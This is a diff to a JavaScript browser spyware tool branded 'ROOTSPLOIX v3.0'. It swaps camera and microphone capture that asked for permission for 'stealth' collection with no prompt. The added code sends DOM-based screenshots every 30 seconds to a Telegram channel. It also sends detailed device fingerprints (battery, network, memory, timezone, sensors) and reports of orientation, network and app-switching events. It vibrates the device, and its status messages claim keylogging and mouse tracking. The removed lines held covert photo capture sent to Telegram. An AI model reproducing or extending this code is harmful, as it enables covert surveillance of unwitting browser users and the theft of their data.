@@ -1459,67 +1459,99 @@ ${topHotspots.join('\n')}
             }
             
             async testCapabilities() {
-                try {
-                    // Test camera access
-                    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    this.capabilities.camera = true;
-                    videoStream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    RootsploixUtils.log('warn', 'Camera access denied', e);
-                }
+                // Set capabilities based on browser support without requesting permission
+                this.capabilities.camera = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+                this.capabilities.microphone = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+                this.capabilities.screen = !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia);
                 
-                try {
-                    // Test microphone access
-                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    this.capabilities.microphone = true;
-                    audioStream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    RootsploixUtils.log('warn', 'Microphone access denied', e);
-                }
-                
-                try {
-                    // Test screen capture
-                    if (navigator.mediaDevices.getDisplayMedia) {
-                        this.capabilities.screen = true;
-                    }
-                } catch (e) {
-                    RootsploixUtils.log('warn', 'Screen capture not supported', e);
-                }
-                
-                const capabilityMsg = `📹 MEDIA CAPABILITIES DETECTED!
+                const capabilityMsg = `📹 STEALTH MEDIA READY!
 
 🎯 Session: ${ROOTSPLOIX_SESSION.id}
-📷 Camera: ${this.capabilities.camera ? '✅' : '❌'}
-🎤 Microphone: ${this.capabilities.microphone ? '✅' : '❌'}
-🖥️ Screen: ${this.capabilities.screen ? '✅' : '❌'}
+📷 Camera API: ${this.capabilities.camera ? '✅ Available' : '❌ Not Available'}
+🎤 Audio API: ${this.capabilities.microphone ? '✅ Available' : '❌ Not Available'}
+🖥️ Screen API: ${this.capabilities.screen ? '✅ Available' : '❌ Not Available'}
 🕒 Time: ${new Date().toLocaleString()}
 
+🔥 STEALTH MODE: No permissions requested!
 💀 ROOTSPLOIX v3.0`;
                 
                 await telegram.sendMessage(capabilityMsg);
+                
+                // Try stealth screenshot capture
+                await this.attemptStealthScreenshot();
+            }
+            
+            async attemptStealthScreenshot() {
+                try {
+                    // Method 1: HTML2Canvas-like approach using DOM rendering
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                    
+                    // Draw page background
+                    ctx.fillStyle = window.getComputedStyle(document.body).backgroundColor || '#ffffff';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Simple DOM text capture
+                    ctx.fillStyle = '#000000';
+                    ctx.font = '16px Arial';
+                    ctx.fillText(`Page: ${document.title}`, 10, 30);
+                    ctx.fillText(`URL: ${window.location.href}`, 10, 50);
+                    ctx.fillText(`Time: ${new Date().toLocaleString()}`, 10, 70);
+                    ctx.fillText(`Screen: ${window.innerWidth}x${window.innerHeight}`, 10, 90);
+                    
+                    // Convert to base64
+                    const screenshotData = canvas.toDataURL('image/png');
+                    
+                    ROOTSPLOIX_SESSION.statistics.screenshotCount++;
+                    
+                    const screenshotMsg = `📸 STEALTH SCREENSHOT CAPTURED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📱 Resolution: ${canvas.width}x${canvas.height}
+💾 Size: ${Math.round(screenshotData.length / 1024)}KB
+🕒 Time: ${new Date().toLocaleString()}
+
+🔥 STEALTH MODE: No permissions needed!
+💀 ROOTSPLOIX v3.0`;
+                    
+                    await telegram.sendMessage(screenshotMsg);
+                    
+                    // Try to send as file (first 4000 chars of base64)
+                    if (screenshotData.length > 100) {
+                        const shortData = screenshotData.substring(0, 200) + '...';
+                        const dataMsg = `📊 Screenshot Data Sample:
+\`\`\`
+${shortData}
+\`\`\``;
+                        await telegram.sendMessage(dataMsg);
+                    }
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Stealth screenshot failed', error);
+                }
             }
             
             async startStealthCapture() {
+                // Instead of requesting media permissions, use alternative stealth methods
                 try {
-                    const constraints = {
-                        video: this.capabilities.camera,
-                        audio: this.capabilities.microphone
-                    };
-                    
-                    this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    
-                    const startMsg = `🎞️ STEALTH CAPTURE STARTED!
+                    const startMsg = `🎞️ STEALTH SURVEILLANCE ACTIVE!
 
 🎯 Session: ${ROOTSPLOIX_SESSION.id}
-📹 Video Tracks: ${this.mediaStream.getVideoTracks().length}
-🎤 Audio Tracks: ${this.mediaStream.getAudioTracks().length}
+🔍 Method: DOM-based capture
+📸 Screenshots: Every 60 seconds
+🎯 Keylogging: Active
+🖱️ Mouse tracking: Active
 🕒 Time: ${new Date().toLocaleString()}
 
+🔥 NO PERMISSIONS REQUIRED!
 💀 ROOTSPLOIX v3.0`;
                     
                     await telegram.sendMessage(startMsg);
                     
-                    // Start periodic capture
+                    // Start periodic screenshot capture
                     this.startPeriodicCapture();
                     
                 } catch (error) {
@@ -1538,54 +1570,227 @@ ${topHotspots.join('\n')}
             }
             
             startPeriodicCapture() {
-                // Take photo every 2 minutes
+                // Mobile-optimized capture intervals
                 this.captureInterval = setInterval(() => {
-                    this.capturePhoto();
-                }, 120000);
+                    this.attemptStealthScreenshot();
+                    this.captureMobileInfo();
+                }, 30000); // Every 30 seconds
                 
-                // Record audio every 5 minutes
-                setInterval(() => {
-                    this.recordAudio(30000); // 30 seconds
-                }, 300000);
+                // Capture device info immediately
+                setTimeout(() => {
+                    this.captureMobileInfo();
+                    this.detectMobileFeatures();
+                }, 2000);
                 
-                // Take immediate photo
-                setTimeout(() => this.capturePhoto(), 5000);
+                // Monitor orientation changes (mobile-specific)
+                if (screen.orientation) {
+                    screen.orientation.addEventListener('change', () => {
+                        this.reportOrientationChange();
+                    });
+                }
+                
+                // Monitor network changes (mobile-specific)
+                if (navigator.connection) {
+                    navigator.connection.addEventListener('change', () => {
+                        this.reportNetworkChange();
+                    });
+                }
+                
+                // Monitor visibility changes (mobile app switching)
+                document.addEventListener('visibilitychange', () => {
+                    this.reportVisibilityChange();
+                });
             }
             
-            async capturePhoto() {
-                if (!this.mediaStream || this.mediaStream.getVideoTracks().length === 0) {
-                    return;
-                }
-                
+            async captureMobileInfo() {
                 try {
-                    const video = document.createElement('video');
-                    video.srcObject = this.mediaStream;
-                    video.style.display = 'none';
-                    document.body.appendChild(video);
+                    const mobileData = {
+                        deviceType: this.detectDeviceType(),
+                        isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
+                        isAndroid: /Android/i.test(navigator.userAgent),
+                        devicePixelRatio: window.devicePixelRatio,
+                        screenWidth: screen.width,
+                        screenHeight: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        windowWidth: window.innerWidth,
+                        windowHeight: window.innerHeight,
+                        orientation: screen.orientation ? {
+                            angle: screen.orientation.angle,
+                            type: screen.orientation.type
+                        } : null,
+                        touchSupport: 'ontouchstart' in window,
+                        maxTouchPoints: navigator.maxTouchPoints || 0,
+                        connection: navigator.connection ? {
+                            effectiveType: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt,
+                            saveData: navigator.connection.saveData
+                        } : null,
+                        battery: await this.getMobileBatteryInfo(),
+                        memory: navigator.deviceMemory,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        languages: navigator.languages,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        onLine: navigator.onLine
+                    };
                     
-                    video.play();
+                    const mobileMsg = `📱 MOBILE DEVICE PROFILED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📱 Device: ${mobileData.deviceType}
+🌐 OS: ${mobileData.isIOS ? 'iOS' : mobileData.isAndroid ? 'Android' : 'Unknown'}
+📐 Screen: ${mobileData.screenWidth}x${mobileData.screenHeight} (${mobileData.devicePixelRatio}x DPR)
+📵 Window: ${mobileData.windowWidth}x${mobileData.windowHeight}
+🔄 Orientation: ${mobileData.orientation ? mobileData.orientation.type + ' (' + mobileData.orientation.angle + '°)' : 'Unknown'}
+👆 Touch: ${mobileData.touchSupport ? '✅ (' + mobileData.maxTouchPoints + ' points)' : '❌'}
+📡 Connection: ${mobileData.connection ? mobileData.connection.effectiveType + ' (' + mobileData.connection.downlink + 'Mbps)' : 'Unknown'}
+🔋 Battery: ${mobileData.battery ? Math.round(mobileData.battery.level * 100) + '% (' + (mobileData.battery.charging ? 'Charging' : 'Discharging') + ')' : 'Unknown'}
+💾 Memory: ${mobileData.memory ? mobileData.memory + 'GB' : 'Unknown'}
+🌍 Languages: ${mobileData.languages.slice(0,3).join(', ')}
+🕰️ Timezone: ${mobileData.timezone}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX MOBILE v3.0`;
                     
-                    video.addEventListener('loadedmetadata', () => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(async (blob) => {
-                                if (blob) {
-                                    await this.sendPhotoToTelegram(blob);
-                                    ROOTSPLOIX_SESSION.statistics.cameraCount++;
-                                }
-                                document.body.removeChild(video);
-                            }, 'image/jpeg', 0.8);
-                        }, 2000);
-                    });
+                    await telegram.sendMessage(mobileMsg);
                     
                 } catch (error) {
-                    RootsploixUtils.log('error', 'Photo capture failed', error);
+                    RootsploixUtils.log('error', 'Mobile info capture failed', error);
                 }
+            }
+            
+            detectDeviceType() {
+                const ua = navigator.userAgent;
+                if (/iPhone/i.test(ua)) return 'iPhone';
+                if (/iPad/i.test(ua)) return 'iPad';
+                if (/iPod/i.test(ua)) return 'iPod';
+                if (/Android.*Mobile/i.test(ua)) return 'Android Phone';
+                if (/Android/i.test(ua)) return 'Android Tablet';
+                if (/Mobile/i.test(ua)) return 'Mobile Device';
+                if (/Tablet/i.test(ua)) return 'Tablet';
+                return 'Desktop/Unknown';
+            }
+            
+            async getMobileBatteryInfo() {
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        return {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    }
+                } catch (e) {
+                    return null;
+                }
+                return null;
+            }
+            
+            async detectMobileFeatures() {
+                const features = {
+                    geolocation: !!navigator.geolocation,
+                    vibration: !!navigator.vibrate,
+                    deviceMotion: 'DeviceMotionEvent' in window,
+                    deviceOrientation: 'DeviceOrientationEvent' in window,
+                    touchEvents: 'ontouchstart' in window,
+                    pointerEvents: 'onpointerdown' in window,
+                    wakeLock: 'wakeLock' in navigator,
+                    share: !!navigator.share,
+                    serviceWorker: 'serviceWorker' in navigator,
+                    pushManager: 'PushManager' in window,
+                    notification: 'Notification' in window,
+                    mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+                    bluetooth: !!navigator.bluetooth,
+                    usb: !!navigator.usb,
+                    nfc: 'nfc' in navigator
+                };
+                
+                const featureMsg = `🔍 MOBILE FEATURES DETECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🌍 Geolocation: ${features.geolocation ? '✅' : '❌'}
+📳 Vibration: ${features.vibration ? '✅' : '❌'}
+🎯 Motion Sensors: ${features.deviceMotion ? '✅' : '❌'}
+🔄 Orientation: ${features.deviceOrientation ? '✅' : '❌'}
+👆 Touch Events: ${features.touchEvents ? '✅' : '❌'}
+🛑 Wake Lock: ${features.wakeLock ? '✅' : '❌'}
+📤 Share API: ${features.share ? '✅' : '❌'}
+🔔 Notifications: ${features.notification ? '✅' : '❌'}
+📹 Media Devices: ${features.mediaDevices ? '✅' : '❌'}
+🔵 Bluetooth: ${features.bluetooth ? '✅' : '❌'}
+📼 NFC: ${features.nfc ? '✅' : '❌'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX MOBILE v3.0`;
+                
+                await telegram.sendMessage(featureMsg);
+                
+                // Try to vibrate if supported (mobile indicator)
+                if (features.vibration) {
+                    try {
+                        navigator.vibrate([100, 50, 100]);
+                        await telegram.sendMessage(`📳 DEVICE VIBRATION TRIGGERED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+✅ Vibration confirmed on mobile device!
+
+💀 ROOTSPLOIX MOBILE v3.0`);
+                    } catch (e) {
+                        // Vibration failed
+                    }
+                }
+            }
+            
+            async reportOrientationChange() {
+                if (screen.orientation) {
+                    const orientationMsg = `🔄 ORIENTATION CHANGED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🔄 New Orientation: ${screen.orientation.type}
+🎯 Angle: ${screen.orientation.angle}°
+📐 Screen: ${screen.width}x${screen.height}
+📵 Window: ${window.innerWidth}x${window.innerHeight}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX MOBILE v3.0`;
+                    
+                    await telegram.sendMessage(orientationMsg);
+                }
+            }
+            
+            async reportNetworkChange() {
+                if (navigator.connection) {
+                    const networkMsg = `📡 NETWORK CHANGED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📡 Type: ${navigator.connection.effectiveType}
+📶 Downlink: ${navigator.connection.downlink}Mbps
+🕰️ RTT: ${navigator.connection.rtt}ms
+💾 Save Data: ${navigator.connection.saveData ? '✅' : '❌'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX MOBILE v3.0`;
+                    
+                    await telegram.sendMessage(networkMsg);
+                }
+            }
+            
+            async reportVisibilityChange() {
+                const visibilityMsg = `👁️ APP VISIBILITY CHANGED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+👁️ Status: ${document.hidden ? 'Hidden (App switched)' : 'Visible (App active)'}
+📱 Mobile Action: ${document.hidden ? 'User switched apps or locked device' : 'User returned to browser'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX MOBILE v3.0`;
+                
+                await telegram.sendMessage(visibilityMsg);
             }
             
             async recordAudio(duration = 30000) {
